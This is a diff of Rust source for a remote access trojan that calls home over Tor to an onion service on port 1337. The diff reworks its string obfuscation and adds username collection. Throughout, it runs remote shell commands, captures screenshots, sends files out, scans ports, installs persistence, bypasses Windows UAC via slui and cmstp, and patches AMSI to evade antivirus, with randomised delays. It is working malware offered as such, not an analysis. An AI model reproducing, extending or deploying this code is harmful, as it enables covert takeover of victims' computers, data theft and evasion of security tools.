@@ -1,5 +1,4 @@
 
-
 #[cfg(target_os = "windows")]
 mod uac_cmstp;
 #[cfg(target_os = "windows")]
@@ -11,7 +10,6 @@ mod portscanner;
 pub mod util;
 #[cfg(feature = "shared-lib")]
 mod exports;
-use goldberg::goldberg_stmts;
 #[cfg(target_os = "windows")]
 use is_elevated::is_elevated;
 
@@ -24,16 +22,16 @@ use tokio::process::Command;
 use anyhow::{Result, anyhow};
 use gethostname::gethostname;
 use tokio::time::{sleep, Duration};
-use std::{fs};
+use std::{fs, env};
 use std::path::{Path};
 use base64::{engine::general_purpose, Engine as _};
 use libc::{c_int};
+use encstr::{astr, xstr};
 
 #[cfg(not(target_os = "android"))]
 use screenshots::{Screen};
 #[cfg(not(target_os = "android"))]
 use screenshots::image::ImageOutputFormat;
-
 
 
 
@@ -59,7 +57,7 @@ impl Default for ClientConfig {
     fn default() -> Self {
         Self {
             onion: get_onion_host(),
-            port: goldberg::goldberg_int!(1337),
+            port: 1337,
         }
     }
 }
@@ -68,7 +66,7 @@ async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
     let config = TorClientConfigBuilder::new()
         .build()?;
     let client = TorClient::create_bootstrapped(config).await?;
-    println!("{}", cryptify::encrypt_string!("Initialized Tor Client"));
+    println!("{}", &astr!("Initialized Tor Client"));
     Ok(client)
 }
 
@@ -77,10 +75,8 @@ fn take_screenshot_base64() -> anyhow::Result<String> {
     let screens = Screen::all()?;
     let screen = &screens[0];
 
-    // Capture screenshot
     let image = screen.capture()?;
 
-    // Encode PNG into memory
     let mut png_bytes: Vec<u8> = Vec::new();
 
     image.write_to(
@@ -88,7 +84,6 @@ fn take_screenshot_base64() -> anyhow::Result<String> {
         ImageOutputFormat::Png,
     )?;
 
-    // Convert PNG bytes -> base64
     let b64 = general_purpose::STANDARD.encode(&png_bytes);
     Ok(format!("{}",b64))
 }
@@ -97,19 +92,25 @@ fn take_screenshot_base64() -> anyhow::Result<String> {
 fn get_hostname() -> String {
     gethostname()
         .into_string()
-        .unwrap_or_else(|_| cryptify::encrypt_string!("unknown").into())
+        .unwrap_or_else(|_| astr!("unknown"))
+}
+
+fn get_username() -> String {
+    env::var(astr!("USER"))
+        .or_else(|_| env::var(astr!("USERNAME")))
+        .unwrap_or_else(|_| astr!("unknown"))
 }
 
 /// Execute a command
 pub async fn run_command(input: &str) -> Result<Vec<u8>> {
     let mut parts = input.trim().split_whitespace();
 
-    let cmd = parts.next().ok_or_else(|| anyhow!(cryptify::encrypt_string!("Empty command")))?;
+    let cmd = parts.next().ok_or_else(|| anyhow!(astr!("Empty command")))?;
     let args: Vec<&str> = parts.collect();
 
     match cmd {
-        "help" | "/h"|"/?" |"" => {
-            Ok(format!("
+        _ if cmd == astr!("help") || cmd == astr!("/h") || cmd == astr!("/?") || cmd.is_empty() => {
+            Ok(xstr!("
 
 Available commands:
     `cd [directory]`=>\t Change Directory to [directory]
@@ -125,26 +126,25 @@ Available commands:
 
     ").into_bytes())
         }
-        "screenshot" => {
+        _ if cmd == astr!("screenshot") => {
             #[cfg(target_os = "android")]
             let encoded = {
-                let output = std::process::Command::new(cryptify::encrypt_string!("/system/bin/screencap"))
-                    .arg(cryptify::encrypt_string!("-p"))
-                    .output()
-                    .context(cryptify::encrypt_string!("Failed to run screencap"))?;
+                let output = std::process::Command::new(astr!("/system/bin/screencap"))
+                    .arg(astr!("-p"))
+                    .output()?;
                 general_purpose::STANDARD.encode(&output.stdout)
             };
             #[cfg(not(target_os = "android"))]
             let encoded = take_screenshot_base64()?;
 
-            let default_filename = cryptify::encrypt_string!("screenshot.png");
-            let filename = args.get(goldberg::goldberg_int!(0)).filter(|s| !s.is_empty()).copied().unwrap_or(&default_filename);
-            Ok(format!("[file] {} {}", filename, encoded).into_bytes())
+            let default_filename = astr!("screenshot.png");
+            let filename = args.get(0).filter(|s| !s.is_empty()).copied().unwrap_or(default_filename.as_str());
+            Ok(format!("{}{} {}", astr!("[file] "), filename, encoded).into_bytes())
         }
-        "upload" => {
+        _ if cmd == astr!("upload") => {
             let input_filename = args
-                .get(goldberg::goldberg_int!(0))
-                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("upload: missing filename")))?;
+                .get(0)
+                .ok_or_else(|| anyhow!(astr!("upload: missing filename")))?;
 
             let path = Path::new(input_filename);
 
@@ -153,27 +153,27 @@ Available commands:
             let filename = path
                 .file_name()
                 .and_then(|f| f.to_str())
-                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("invalid filename")))?;
+                .ok_or_else(|| anyhow!(astr!("invalid filename")))?;
             let encoded = general_purpose::STANDARD.encode(&data);
 
-            let mut output = format!("[file-start] {}\n", filename);
+            let mut output = format!("{}{}\n", astr!("[file-start] "), filename);
             for chunk in encoded.as_bytes().chunks(16384) {
                 let chunk_str = std::str::from_utf8(chunk).unwrap();
-                output.push_str(&cryptify::encrypt_string!("[file-chunk] "));
+                output.push_str(&astr!("[file-chunk] "));
                 output.push_str(chunk_str);
                 output.push('\n');
             }
-            output.push_str(&format!("[file-end] {}\n", filename));
+            output.push_str(&format!("{}{}\n", astr!("[file-end] "), filename));
             Ok(output.into_bytes())
         }
-        "download" | "[file][" => {
+        _ if cmd == astr!("download") || cmd == astr!("[file][") => {
             let input_filename = args
-                .get(goldberg::goldberg_int!(0))
-                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("download: missing filename")))?;
+                .get(0)
+                .ok_or_else(|| anyhow!(astr!("download: missing filename")))?;
 
             let encoded = args
-                .get(goldberg::goldberg_int!(1))
-                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("download: missing data")))?;
+                .get(1)
+                .ok_or_else(|| anyhow!(astr!("download: missing data")))?;
 
             let data = general_purpose::STANDARD.decode(encoded)?;
 
@@ -181,141 +181,142 @@ Available commands:
 
             fs::write(path, &data)?;
 
-            Ok(format!("Wrote data to {}", input_filename).into_bytes())
+            Ok(format!("{}{}", astr!("Wrote data to "), input_filename).into_bytes())
         }
-        "cd" => {
-            let target = args.get(goldberg::goldberg_int!(0)).ok_or_else(|| anyhow!(cryptify::encrypt_string!("cd: missing argument")))?;
+        _ if cmd == astr!("cd") => {
+            let target = args.get(0).ok_or_else(|| anyhow!(astr!("cd: missing argument")))?;
 
             match std::env::set_current_dir(target) {
                 Ok(_) => {
                     let cwd = std::env::current_dir()?;
-                    Ok(format!("Changed directory to {}\n", cwd.display()).into_bytes())
+                    Ok(format!("{}{}\n", astr!("Changed directory to "), cwd.display()).into_bytes())
                 }
                 Err(e) => {
-                    Ok(format!("cd error: {}\n", e).into_bytes())
+                    Ok(format!("{}{}\n", astr!("cd error: "), e).into_bytes())
                 }
             }
         }
-        "uac" => {
+        _ if cmd == astr!("uac") => {
             #[cfg(target_os = "windows")]
             {
                 if args.is_empty() {
-                    return Ok(b"uac: missing argument\n".to_vec());
+                    return Ok(astr!("uac: missing argument\n").into_bytes());
                 }
 
-                let payload = args.join(cryptify::encrypt_string!(" ").as_str());
+                let payload = args.join(" ");
                 uac_bypass::uac_slui(&payload);
 
-                Ok(format!("Triggered UAC (slui) with payload: {}\n", payload).into_bytes())
+                Ok(format!("{}{}\n", astr!("Triggered UAC (slui) with payload: "), payload).into_bytes())
             }
 
             #[cfg(not(target_os = "windows"))]
             {
-                Ok(b"uac not supported on this OS\n".to_vec())
+                Ok(astr!("uac not supported on this OS\n").into_bytes())
             }
         }
 
-        "uac2" => {
+        _ if cmd == astr!("uac2") => {
             #[cfg(target_os = "windows")]
             {
                 if args.is_empty() {
-                    return Ok(b"uac2: missing argument\n".to_vec());
+                    return Ok(astr!("uac2: missing argument\n").into_bytes());
                 }
 
-                let payload = args.join(cryptify::encrypt_string!(" ").as_str());
+                let payload = args.join(" ");
                 let ret = uac_cmstp::execute(&payload);
                 if ret == 0 {
-                    Ok(format!("UAC (cmstp) triggered with payload: {}\n", payload).into_bytes())
+                    Ok(format!("{}{}\n", astr!("UAC (cmstp) triggered with payload: "), payload).into_bytes())
                 } else {
-                    Ok(format!("UAC (cmstp) failed (returned {}) with payload: {}\n", ret, payload).into_bytes())
+                    Ok(format!("{}{}{}{}\n", astr!("UAC (cmstp) failed (returned "), ret, astr!(") with payload: "), payload).into_bytes())
                 }
             }
 
             #[cfg(not(target_os = "windows"))]
             {
-                Ok(b"uac2 not supported on this OS\n".to_vec())
+                Ok(astr!("uac2 not supported on this OS\n").into_bytes())
             }
         }
 
-        "check_elevated" => {
+        _ if cmd == astr!("check_elevated") => {
             #[cfg(target_os = "windows")]
             {
                 let elevated = is_elevated();
-                Ok(format!("Elevated: {}\n", elevated).into_bytes())
+                Ok(format!("{}{}\n", astr!("Elevated: "), elevated).into_bytes())
             }
             #[cfg(not(target_os = "windows"))]
             {
-                Ok(b"check_elevated not supported on this OS\n".to_vec())
+                Ok(astr!("check_elevated not supported on this OS\n").into_bytes())
             }
         }
 
-        "self_uac" => {
+        _ if cmd == astr!("self_uac") => {
             #[cfg(target_os = "windows")]
             {
                 let exe_path = match std::env::current_exe() {
                     Ok(p) => p.to_string_lossy().to_string(),
-                    Err(_) => return Ok(b"Failed to get exe path\n".to_vec()),
+                    Err(_) => return Ok(astr!("Failed to get exe path\n").into_bytes()),
                 };
                 uac_bypass::uac_slui(&exe_path);
-                Ok(format!("Self-UAC triggered (slui) for: {}\n", exe_path).into_bytes())
+                Ok(format!("{}{}\n", astr!("Self-UAC triggered (slui) for: "), exe_path).into_bytes())
             }
             #[cfg(not(target_os = "windows"))]
             {
-                Ok(b"self_uac not supported on this OS\n".to_vec())
+                Ok(astr!("self_uac not supported on this OS\n").into_bytes())
             }
         }
 
-        "persist" => {
+        _ if cmd == astr!("persist") => {
             let _ = persist::persist();
-            Ok(b"Persistence applied\n".to_vec())
+            Ok(astr!("Persistence applied\n").into_bytes())
         }
 
-        "portscan" => {
-            let protocol = args.get(goldberg::goldberg_int!(0)).ok_or_else(|| anyhow!(cryptify::encrypt_string!("portscan: missing protocol")))?.to_lowercase();
-            let host = args.get(goldberg::goldberg_int!(1)).ok_or_else(|| anyhow!(cryptify::encrypt_string!("portscan: missing host")))?.to_string();
-            let fast = args.contains(&cryptify::encrypt_string!("--fast").as_str());
+        _ if cmd == astr!("portscan") => {
+            let protocol = args.get(0).ok_or_else(|| anyhow!(astr!("portscan: missing protocol")))?.to_lowercase();
+            let host = args.get(1).ok_or_else(|| anyhow!(astr!("portscan: missing host")))?.to_string();
+            let fast = args.iter().any(|a| *a == astr!("--fast"));
 
             let ports: Vec<u16> = if fast {
                 portscanner::COMMON_PORTS.to_vec()
             } else {
-                (goldberg::goldberg_int!(1)..=goldberg::goldberg_int!(65535)).collect()
+                (1..=65535).collect()
             };
 
             let total = ports.len();
-            let msg = format!("Scanning {} ports on {} ({})...\n", total, host, protocol);
+            let msg = format!("{}{}{}{}{}{}{}", astr!("Scanning "), total, astr!(" ports on "), host, astr!(" ("), protocol, astr!(")...\n"));
             let scan_type = protocol.as_str();
 
             let open = match scan_type {
-                "tcp" => portscanner::scan_tcp(&host, &ports).await,
-                "udp" => portscanner::scan_udp(&host, &ports).await,
-                "sctp" => {
+                _ if scan_type == astr!("tcp") => portscanner::scan_tcp(&host, &ports).await,
+                _ if scan_type == astr!("udp") => portscanner::scan_udp(&host, &ports).await,
+                _ if scan_type == astr!("sctp") => {
                     #[cfg(unix)]
                     { portscanner::scan_sctp(&host, &ports).await }
                     #[cfg(not(unix))]
-                    { return Err(anyhow!(cryptify::encrypt_string!("SCTP scan not supported on this OS"))); }
+                    { return Err(anyhow!(astr!("SCTP scan not supported on this OS"))); }
                 }
-                _ => return Err(anyhow!("portscan: unknown protocol '{}' (use tcp, udp, or sctp)", protocol)),
+                _ => return Err(anyhow!("{}{}{}", astr!("portscan: unknown protocol '"), protocol, astr!("' (use tcp, udp, or sctp)"))),
             };
 
             if open.is_empty() {
-                Ok(format!("{}No open ports found on {}\n", msg, host).into_bytes())
+                Ok(format!("{}{}{}\n", msg, astr!("No open ports found on "), host).into_bytes())
             } else {
-                Ok(format!("{}Open ports on {} ({}): {}\n",
-                    msg, host, protocol,
-                    open.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(", ")
+                Ok(format!("{}{}{}{}{}{}{}{}",
+                    msg, astr!("Open ports on "), host, astr!(" ("), protocol, astr!("): "),
+                    open.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(", "),
+                    astr!("\n")
                 ).into_bytes())
             }
         }
 
-        "exit" | "quit" | "/quit" => {
-            Ok(cryptify::encrypt_string!("Goodbye\n").as_bytes().to_vec())
+        _ if cmd == astr!("exit") || cmd == astr!("quit") || cmd == astr!("/quit") => {
+            Ok(astr!("Goodbye\n").into_bytes())
         }
 
-        _ => goldberg_stmts!({
+        _ => {
             #[cfg(target_os = "windows")]
             let mut command = {
-                let mut c = Command::new(cryptify::encrypt_string!("cmd.exe"));
-                c.arg(cryptify::encrypt_string!("/C"))
+                let mut c = Command::new(astr!("cmd.exe"));
+                c.arg(astr!("/C"))
                     .arg(input)
                     .creation_flags(CREATE_NO_WINDOW);
                 c
@@ -323,24 +324,22 @@ Available commands:
 
             #[cfg(target_os = "linux")]
             let mut command = {
-                let mut c = Command::new(cryptify::encrypt_string!("/bin/sh"));
-                c.arg(cryptify::encrypt_string!("-c")).arg(input);
+                let mut c = Command::new(astr!("/bin/sh"));
+                c.arg(astr!("-c")).arg(input);
                 c
             };
             #[cfg(target_os = "macos")]
             let mut command = {
-                let mut c = Command::new(cryptify::encrypt_string!("/bin/sh"));
-                c.arg(cryptify::encrypt_string!("-c")).arg(input);
+                let mut c = Command::new(astr!("/bin/sh"));
+                c.arg(astr!("-c")).arg(input);
                 c
             };
             #[cfg(target_os = "android")]
             let mut command = {
-                let mut c = Command::new(cryptify::encrypt_string!("/system/bin/sh"));
-                c.arg(cryptify::encrypt_string!("-c")).arg(input);
+                let mut c = Command::new(astr!("/system/bin/sh"));
+                c.arg(astr!("-c")).arg(input);
                 c
             };
-
-
 
             let output = command.output().await?;
             let mut result = Vec::new();
@@ -348,7 +347,7 @@ Available commands:
             result.extend_from_slice(&output.stderr);
 
             if result.is_empty() {
-                result.extend_from_slice(b"(no output)\n");
+                result.extend_from_slice(&astr!("(no output)\n").into_bytes());
             }
 
             if !result.ends_with(b"\n") {
@@ -356,7 +355,7 @@ Available commands:
             }
 
             Ok(result)
-        })
+        }
     }
 }
 
@@ -379,14 +378,24 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
     let mut dl_data: String = String::new();
 
     let hostname = get_hostname();
-    writer.write_all(hostname.as_bytes()).await?;
+    let username = get_username();
+
+    fn make_prompt(username: &str, hostname: &str) -> String {
+        let cwd = std::env::current_dir()
+            .map(|p| p.display().to_string())
+            .unwrap_or_else(|_| astr!("?"));
+        format!("{}{}{}{}{}{}", username, astr!("@"), hostname, astr!(" ["), cwd, astr!("] >> "))
+    }
+
+    let initial_prompt = make_prompt(&username, &hostname);
+    writer.write_all(initial_prompt.as_bytes()).await?;
     writer.flush().await?;
 
     loop {
         let n = reader.read(&mut buf).await?;
 
         if n == 0 {
-            println!("{}", cryptify::encrypt_string!("Connection closed by remote"));
+            println!("{}", &astr!("Connection closed by remote"));
             return Ok(false);
         }
 
@@ -398,26 +407,26 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
 
             line = line.trim().to_string();
 
-            if line.starts_with(&cryptify::encrypt_string!("download-start ")) {
-                let parts: Vec<&str> = line.splitn(goldberg::goldberg_int!(2), ' ').collect();
-                dl_filename = Some(parts.get(goldberg::goldberg_int!(1)).copied().unwrap_or(&cryptify::encrypt_string!("unknown")).to_string());
+            if line.starts_with(&astr!("download-start ")) {
+                let parts: Vec<&str> = line.splitn(2, ' ').collect();
+                dl_filename = Some(parts.get(1).copied().unwrap_or(astr!("unknown").as_str()).to_string());
                 dl_data.clear();
                 continue;
             }
 
             if dl_filename.is_some() {
-                if line.starts_with(&cryptify::encrypt_string!("download-chunk ")) {
-                    let parts: Vec<&str> = line.splitn(goldberg::goldberg_int!(2), ' ').collect();
-                    if let Some(chunk) = parts.get(goldberg::goldberg_int!(1)) {
+                if line.starts_with(&astr!("download-chunk ")) {
+                    let parts: Vec<&str> = line.splitn(2, ' ').collect();
+                    if let Some(chunk) = parts.get(1) {
                         dl_data.push_str(chunk);
                     }
                     continue;
                 }
-                if line == cryptify::encrypt_string!("download-end") {
+                if line == astr!("download-end") {
                     let fname = dl_filename.take().unwrap();
                     let raw = general_purpose::STANDARD.decode(&dl_data)?;
                     fs::write(&fname, &raw)?;
-                    let msg = format!("Wrote data to {}\n", fname);
+                    let msg = format!("{}{}\n", astr!("Wrote data to "), fname);
                     writer.write_all(msg.as_bytes()).await?;
                     writer.flush().await?;
                     continue;
@@ -430,8 +439,8 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
                 continue;
             }
 
-            if line == cryptify::encrypt_string!("exit") || line == cryptify::encrypt_string!("quit") || line == cryptify::encrypt_string!("/quit") {
-                writer.write_all(b"Goodbye\n").await?;
+            if line == astr!("exit") || line == astr!("quit") || line == astr!("/quit") {
+                writer.write_all(&astr!("Goodbye\n").into_bytes()).await?;
                 writer.flush().await?;
                 return Ok(true);
             }
@@ -441,11 +450,13 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
               writer.write_all(&output).await?;
               }
               Err(e) => {
-                let err_msg = format!("ERROR: {}\n", e);
+                let err_msg = format!("{}{}\n", astr!("ERROR: "), e);
                 writer.write_all(err_msg.as_bytes()).await?;
             }
         }
 
+        let prompt = make_prompt(&username, &hostname);
+        writer.write_all(prompt.as_bytes()).await?;
         writer.flush().await?;
         }
     }
@@ -460,33 +471,33 @@ fn rand_range(min: u64, max: u64) -> u64 {
 /// Core runner
 pub async fn netclient_run(config: ClientConfig) -> Result<()> {
     loop {
-        println!("{}", cryptify::encrypt_string!("Attempting to connect..."));
+        println!("{}", &astr!("Attempting to connect..."));
 
         let tor_client = init_tor().await?;
 
         match connect_onion(&tor_client, &config.onion, config.port).await {
             Ok(stream) => {
-                println!("{}", cryptify::encrypt_string!("Connected to onion service"));
+                println!("{}", &astr!("Connected to onion service"));
 
                 match read_loop(stream).await {
                     Ok(true) => {
-                        println!("{}", cryptify::encrypt_string!("Exit requested"));
+                        println!("{}", &astr!("Exit requested"));
                         break;
                     }
                     Ok(false) => {
-                        println!("{}", cryptify::encrypt_string!("Connection closed"));
+                        println!("{}", &astr!("Connection closed"));
                     }
                     Err(e) => {
-                        println!("Session error: {}", e);
+                        println!("{}{}", astr!("Session error: "), e);
                     }
                 }
             }
             Err(e) => {
-                println!("Connection failed: {}", e);
+                println!("{}{}", astr!("Connection failed: "), e);
             }
         }
-        let delay = rand_range(goldberg::goldberg_int!(13), goldberg::goldberg_int!(121));
-        println!("Reconnecting in {} seconds...", delay);
+        let delay = rand_range(13, 121);
+        println!("{}{}{}", astr!("Reconnecting in "), delay, astr!(" seconds..."));
         sleep(Duration::from_secs(delay)).await;
     }
     Ok(())
@@ -495,30 +506,26 @@ pub async fn netclient_run(config: ClientConfig) -> Result<()> {
 
 async fn netclient_impl() -> c_int {
     #[cfg(target_os = "windows")]
-    goldberg_stmts!({
+    {
         let executable = std::env::current_exe().unwrap().display().to_string();
         uac_cmstp::execute(&executable);
-        println!("Ran uac bypass. sleeping for 31 seconds");
+        println!("{}", &astr!("Ran uac bypass. sleeping for 31 seconds"));
         sleep(Duration::from_secs(31)).await;
-    });
-    let startup_delay = rand_range(goldberg::goldberg_int!(17), goldberg::goldberg_int!(42));
-    println!("{} {}s", cryptify::encrypt_string!("Delaying startup by"), startup_delay);
+    }
+    let startup_delay = rand_range(1, 13);
+    println!("{}{}{}", astr!("Delaying startup by "), startup_delay, astr!("s"));
     sleep(Duration::from_secs(startup_delay)).await;
-    goldberg_stmts!({
-        let _ = netclient_run(ClientConfig::default()).await;
-        0
-    })
+    let _ = persist::persist();
+    let _ = netclient_run(ClientConfig::default()).await;
+    0
 }
 pub async fn netclient() -> c_int {
-    let _ = amsi::patch_amsi();
+    //let _ = amsi::patch_amsi();
     #[cfg(target_os = "windows")]
         {
-            let exe_path = match std::env::current_exe() {
-                Ok(p) => p.to_string_lossy().to_string(),
-                Err(_) => return 2,                };
-            uac_cmstp::execute(&exe_path);
+            let _ = amsi::patch_amsi();
         }
-    let _ = persist::persist();
+    //let _ = persist::persist();
     netclient_impl().await;
     0
 }
